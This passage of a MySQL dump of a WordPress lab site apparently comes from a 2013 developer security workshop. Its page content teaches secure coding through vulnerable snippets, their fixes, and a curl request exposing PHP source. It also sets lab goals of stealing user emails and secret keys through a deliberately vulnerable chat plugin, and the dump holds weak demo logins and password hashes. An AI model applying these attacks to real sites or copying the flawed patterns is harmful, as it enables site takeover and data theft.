hashes, etc.\r\n\r\n<a href=\"http://php.net/manual/en/types.comparisons.php\">PHP Type Comparisons</a>.\r\n\r\n<h3>The App\'s MySQL Collation is Probably Case Insensitive</h3>\r\n[code lang=sql]\r\nSELECT `id`, `secret`\r\n  FROM `user_secrets`\r\n  WHERE `secret` = \'abc123\';\r\n--> 1, AbC123\r\n[/code]\r\n\r\n<h4>This Would Have Stopped Us</h4>\r\n[code lang=sql]\r\nSELECT `id`, `secret`\r\n  FROM `user_secrets`\r\n  WHERE `secret` = BINARY \'abc123\';\r\n--> 7, abc123\r\n[/code]\r\n\r\n<h3>Signatures: <code>hash_hmac()</code> &gt; <code>md5()</code></h3>\r\n[code lang=php]\r\n$hash = md5( $key . $data ); # Boo\r\n$hash = hash_hmac( \'md5\', $data, $key ); # Yay!\r\n[/code]\r\n\r\n<a href=\"http://en.wikipedia.org/wiki/Length_extension_attack\">Hash length extension attack</a>.\r\n\r\n<h3>JS Sanitation Is Important</h3>\r\n\r\nWe don\'t need quotes to do anything in JavaScript.\r\n\r\n[code lang=js]\r\n/foo/.substr(1, 3); // \"foo\"\r\n[/code]\r\n\r\nIn fact, we only need the following six characters :)\r\n\r\n<code>()[]!+</code>\r\n\r\n<a href=\"http://patriciopalladino.com/blog/2012/08/09/non-alphanumeric-javascript.html\">http://patriciopalladino.com/blog/2012/08/09/non-alphanumeric-javascript.html</a>\r\n\r\n<h3>SSL Host Verification Off by Default :(</h3>\r\n[code lang=php]\r\nfile_get_contents( \'https://example.com/\' ); // :(\r\n[/code]\r\n\r\n<h4>This Would Have Stopped Us</h4>\r\n[code lang=php]\r\n$curl = curl_init( \'https://example.com/\' );\r\ncurl_setopt( $curl, CURLOPT_RETURNTRANSFER, true );\r\ncurl_exec( $curl );\r\n[/code]\r\n\r\nApps should always use cURL. (Or <code>wp_remote_*()</code>.)\r\n\r\n<h3><code>wp_redirect()</code> Doesn\'t Exit</h3>\r\n[code lang=php]\r\n<?php\r\nrequire \'wp-load.php\';\r\nif (\r\n  empty( $_GET[\'token\'] )\r\n||\r\n  \'some-token\' !== $_GET[\'token\']\r\n)\r\n  wp_safe_redirect( \'Location: /\' );\r\n\r\nreadfile( __FILE__ );\r\n\r\nexit();\r\n[/code]\r\n\r\n<h4>Attack</h4>\r\n\r\n[code lang=bash]\r\n$ curl -v http://192.168.1.40/trunk/demo.php\r\n* About to connect() to 192.168.1.40 port 80 (#0)\r\n*   Trying 192.168.1.40... connected\r\n> GET /trunk/demo.php HTTP/1.1\r\n> User-Agent: curl/7.22.0 (x86_64-pc-linux-gnu) libcurl/7.22.0 OpenSSL/1.0.1 zlib/1.2.3.4 libidn/1.23 librtmp/2.3\r\n> Host: 192.168.1.40\r\n> Accept: */*\r\n> \r\n< HTTP/1.1 302 Found\r\n< Date: Fri, 12 Apr 2013 13:50:58 GMT\r\n< Server: Apache/2.2.22 (Ubuntu)\r\n< X-Powered-By: PHP/5.4.13-2~precise+1\r\n< Location: http://192.168.1.35/trunk/wp-admin/\r\n< Vary: Accept-Encoding\r\n< Content-Length: 164\r\n< Content-Type: text/html\r\n< \r\n<?php\r\nrequire \'wp-load.php\';\r\nif (\r\n  empty( $_GET[\'token\'] )\r\n||\r\n  \'some-token\' !== $_GET[\'token\']\r\n)\r\n  wp_safe_redirect( \'Location: /\' );\r\n\r\nreadfile( __FILE__ );\r\n\r\nexit();\r\n* Connection #0 to host 192.168.1.40 left intact\r\n* Closing connection #0\r\n[/code]\r\n\r\n<h4>This Would Have Stopped Us</h4>\r\n[code lang=php]\r\nif (\r\n  empty( $_GET[\'token\'] )\r\n||\r\n  \'some-token\' !== $_GET[\'token\']\r\n) {\r\n  wp_safe_redirect( \'Location: /\' );\r\n  exit();\r\n}\r\n[/code]\r\n\r\n<!--nextpage-->\r\n\r\n<h2>Links for Developers</h2>\r\n\r\n<h3>Survive The Deep End: PHP Security</h3>\r\n<a href=\"http://phpsecurity.readthedocs.org/\">http://phpsecurity.readthedocs.org/</a>\r\n\r\n<h3>OWASP: The Open Web Application Security Project</h3>\r\n<a href=\"http://owasp.com/\">http://owasp.com/</a>\r\n\r\n<!--nextpage-->\r\n\r\n<h2>Time to Become a H4x0R</h2>\r\n\r\nThere is a chat widget enabled in the sidebar of this blog.\r\n\r\nThe code is at wp-content/plugins/Chat-Sploit/\r\n\r\nFeel free to read it.\r\n\r\n<h3>Your Goal as the Attacker</h3>\r\nWhile logged in as the user \"author\" (password: \"author\"),\r\n<ul>\r\n	<li>Make the \"admin\" user say something,</li>\r\n	<li>Git a list of all user\'s email addresses,</li>\r\n	<li>Get the site\'s <code>SECRET_KEY</code>s ...,</li>\r\n	<li>... and <code>SECRET_SALT</code>s.</li>\r\n</ul>\r\n\r\nNote: That\'s a <code>&lt;ul&gt;</code>.  Do these attacks in whatever order you like.\r\n\r\n<!--nextpage-->\r\n\r\n<h2>Time to Become a 1337 H4x0R</h2>\r\n\r\nLog in as \"admin\" (password: \"admin\") and activate the Member\'s Only plugin.\r\n\r\n(The default settings should be fine.)\r\n\r\nNow, <strong>log out entirely</strong>.\r\n\r\nWhile logged out, do everything again :)\r\n<ul>\r\n	<li>Make the \"admin\" user say something,</li>\r\n	<li>Git a list of all user\'s email addresses,</li>\r\n	<li>Get the site\'s <code>SECRET_KEY</code>s ...,</li>\r\n	<li>... and <code>SECRET_SALT</code>s.</li>\r\n</ul>\r\n\r\nAgain, in whatever order you like.','VIP Developer Workshop 2013 - Napa, CA','','publish','closed','closed','','vip-developer-workshop-2013-napa-ca','','','2013-05-05 08:22:58','2013-05-05 08:22:58','',0,'http://127.0.0.1:9080/wordpress/?page_id=7',0,'page','',0),(14,1,'2013-04-11 20:44:14','0000-00-00 00:00:00',' ','','','draft','open','closed','','','','','2013-04-11 20:44:14','0000-00-00 00:00:00','',0,'http://127.0.0.1:9080/wordpress/?p=14',1,'nav_menu_item','',0),(15,1,'2013-04-11 20:44:14','0000-00-00 00:00:00',' ','','','draft','open','closed','','','','','2013-04-11 20:44:14','0000-00-00 00:00:00','',0,'http://127.0.0.1:9080/wordpress/?p=15',1,'nav_menu_item','',0),(16,1,'2013-04-11 20:44:41','0000-00-00 00:00:00',' ','','','draft','open','closed','','','','','2013-04-11 20:44:41','0000-00-00 00:00:00','',0,'http://127.0.0.1:9080/wordpress/?p=16',1,'nav_menu_item','',0),(17,1,'2013-04-11 20:44:41','0000-00-00 00:00:00',' ','','','draft','open','closed','','','','','2013-04-11 20:44:41','0000-00-00 00:00:00','',0,'http://127.0.0.1:9080/wordpress/?p=17',1,'nav_menu_item','',0),(18,1,'2013-04-11 20:44:56','0000-00-00 00:00:00',' ','','','draft','open','closed','','','','','2013-04-11 20:44:56','0000-00-00 00:00:00','',0,'http://127.0.0.1:9080/wordpress/?p=18',1,'nav_menu_item','',0),(19,1,'2013-04-11 20:44:56','0000-00-00 00:00:00',' ','','','draft','open','closed','','','','','2013-04-11 20:44:56','0000-00-00 00:00:00','',0,'http://127.0.0.1:9080/wordpress/?p=19',1,'nav_menu_item','',0),(192,2,'2013-05-05 18:16:01','0000-00-00 00:00:00','','Auto Draft','','auto-draft','open','closed','','','','','2013-05-05 18:16:01','0000-00-00 00:00:00','',0,'http://127.0.0.1:9080/wordpress/?p=192',0,'post','',0),(193,1,'2013-05-05 18:44:39','0000-00-00 00:00:00','','Auto Draft','','auto-draft','open','closed','','','','','2013-05-05 18:44:39','0000-00-00 00:00:00','',0,'http://127.0.0.1:9080/wordpress/?p=193',0,'post','',0);
/*!40000 ALTER TABLE `wp_posts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `wp_term_relationships`
--

DROP TABLE IF EXISTS `wp_term_relationships`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `wp_term_relationships` (
  `object_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  `term_taxonomy_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  `term_order` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`object_id`,`term_taxonomy_id`),
  KEY `term_taxonomy_id` (`term_taxonomy_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `wp_term_relationships`
--

LOCK TABLES `wp_term_relationships` WRITE;
/*!40000 ALTER TABLE `wp_term_relationships` DISABLE KEYS */;
/*!40000 ALTER TABLE `wp_term_relationships` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `wp_term_taxonomy`
--

DROP TABLE IF EXISTS `wp_term_taxonomy`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `wp_term_taxonomy` (
  `term_taxonomy_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `term_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  `taxonomy` varchar(32) NOT NULL DEFAULT '',
  `description` longtext NOT NULL,
  `parent` bigint(20) unsigned NOT NULL DEFAULT '0',
  `count` bigint(20) NOT NULL DEFAULT '0',
  PRIMARY KEY (`term_taxonomy_id`),
  UNIQUE KEY `term_id_taxonomy` (`term_id`,`taxonomy`),
  KEY `taxonomy` (`taxonomy`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `wp_term_taxonomy`
--

LOCK TABLES `wp_term_taxonomy` WRITE;
/*!40000 ALTER TABLE `wp_term_taxonomy` DISABLE KEYS */;
INSERT INTO `wp_term_taxonomy` VALUES (1,1,'category','',0,0),(3,3,'nav_menu','',0,0);
/*!40000 ALTER TABLE `wp_term_taxonomy` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `wp_terms`
--

DROP TABLE IF EXISTS `wp_terms`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `wp_terms` (
  `term_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(200) NOT NULL DEFAULT '',
  `slug` varchar(200) NOT NULL DEFAULT '',
  `term_group` bigint(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`term_id`),
  UNIQUE KEY `slug` (`slug`),
  KEY `name` (`name`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `wp_terms`
--

LOCK TABLES `wp_terms` WRITE;
/*!40000 ALTER TABLE `wp_terms` DISABLE KEYS */;
INSERT INTO `wp_terms` VALUES (1,'Uncategorized','uncategorized',0),(3,'Menu 1','menu-1',0);
/*!40000 ALTER TABLE `wp_terms` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `wp_usermeta`
--

DROP TABLE IF EXISTS `wp_usermeta`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `wp_usermeta` (
  `umeta_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  `meta_key` varchar(255) DEFAULT NULL,
  `meta_value` longtext,
  PRIMARY KEY (`umeta_id`),
  KEY `user_id` (`user_id`),
  KEY `meta_key` (`meta_key`)
) ENGINE=InnoDB AUTO_INCREMENT=42 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `wp_usermeta`
--

LOCK TABLES `wp_usermeta` WRITE;
/*!40000 ALTER TABLE `wp_usermeta` DISABLE KEYS */;
INSERT INTO `wp_usermeta` VALUES (1,1,'first_name',''),(2,1,'last_name',''),(3,1,'nickname','admin'),(4,1,'description',''),(5,1,'rich_editing','true'),(6,1,'comment_shortcuts','false'),(7,1,'admin_color','fresh'),(8,1,'use_ssl','0'),(9,1,'show_admin_bar_front','false'),(10,1,'wp_capabilities','a:1:{s:13:\"administrator\";b:1;}'),(11,1,'wp_user_level','10'),(12,1,'dismissed_wp_pointers','wp330_toolbar,wp330_saving_widgets,wp340_choose_image_from_library,wp340_customize_current_theme_link,wp350_media'),(13,1,'show_welcome_panel','0'),(14,1,'wp_dashboard_quick_press_last_post_id','193'),(15,1,'wp_user-settings','editor=html&hidetb=1&ed_size=571&mfold=f&libraryContent=browse&urlbutton=none'),(16,1,'wp_user-settings-time','1367721803'),(17,1,'closedpostboxes_page','a:0:{}'),(18,1,'metaboxhidden_page','a:8:{i:0;s:13:\"pageparentdiv\";i:1;s:12:\"postimagediv\";i:2;s:10:\"postcustom\";i:3;s:16:\"commentstatusdiv\";i:4;s:11:\"commentsdiv\";i:5;s:7:\"slugdiv\";i:6;s:9:\"authordiv\";i:7;s:12:\"revisionsdiv\";}'),(19,1,'managenav-menuscolumnshidden','a:4:{i:0;s:11:\"link-target\";i:1;s:11:\"css-classes\";i:2;s:3:\"xfn\";i:3;s:11:\"description\";}'),(20,1,'metaboxhidden_nav-menus','a:3:{i:0;s:8:\"add-post\";i:1;s:12:\"add-post_tag\";i:2;s:15:\"add-post_format\";}'),(21,1,'nav_menu_recently_edited','3'),(22,1,'aim',''),(23,1,'yim',''),(24,1,'jabber',''),(25,1,'meta-box-order_page','a:3:{s:4:\"side\";s:26:\"pageparentdiv,postimagediv\";s:6:\"normal\";s:80:\"postcustom,commentstatusdiv,commentsdiv,slugdiv,authordiv,submitdiv,revisionsdiv\";s:8:\"advanced\";s:0:\"\";}'),(26,1,'screen_layout_page','1'),(27,2,'first_name',''),(28,2,'last_name',''),(29,2,'nickname','author'),(30,2,'description',''),(31,2,'rich_editing','true'),(32,2,'comment_shortcuts','false'),(33,2,'admin_color','fresh'),(34,2,'use_ssl','0'),(35,2,'show_admin_bar_front','true'),(36,2,'wp_capabilities','a:1:{s:6:\"author\";b:1;}'),(37,2,'wp_user_level','2'),(38,2,'dismissed_wp_pointers','wp330_toolbar,wp330_saving_widgets,wp340_choose_image_from_library,wp340_customize_current_theme_link,wp350_media'),(39,2,'wp_dashboard_quick_press_last_post_id','192'),(40,2,'edit_comments_per_page','100'),(41,1,'edit_comments_per_page','100');
/*!40000 ALTER TABLE `wp_usermeta` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `wp_users`
--

DROP TABLE IF EXISTS `wp_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `wp_users` (
  `ID` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `user_login` varchar(60) NOT NULL DEFAULT '',
  `user_pass` varchar(64) NOT NULL DEFAULT '',
  `user_nicename` varchar(50) NOT NULL DEFAULT '',
  `user_email` varchar(100) NOT NULL DEFAULT '',
  `user_url` varchar(100) NOT NULL DEFAULT '',
  `user_registered` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `user_activation_key` varchar(60) NOT NULL DEFAULT '',
  `user_status` int(11) NOT NULL DEFAULT '0',
  `display_name` varchar(250) NOT NULL DEFAULT '',
  PRIMARY KEY (`ID`),
  KEY `user_login_key` (`user_login`),
  KEY `user_nicename` (`user_nicename`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `wp_users`
--

LOCK TABLES `wp_users` WRITE;
/*!40000 ALTER TABLE `wp_users` DISABLE KEYS */;
INSERT INTO `wp_users` VALUES (1,'admin','$P$BaXoyr7yXlFiOpNAk2VwJMuuJzNwLX.','admin','sample2@gravatar.com','','2013-02-02 09:51:42','',0,'admin'),(2,'author','$P$BhjsxhqOKb6fGJ8u8MqizybTBVKhXc0','author','sample3@gravatar.com','','2013-05-05 18:15:43','',0,'author');
/*!40000 ALTER TABLE `wp_users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2013-05-06  1:17:12
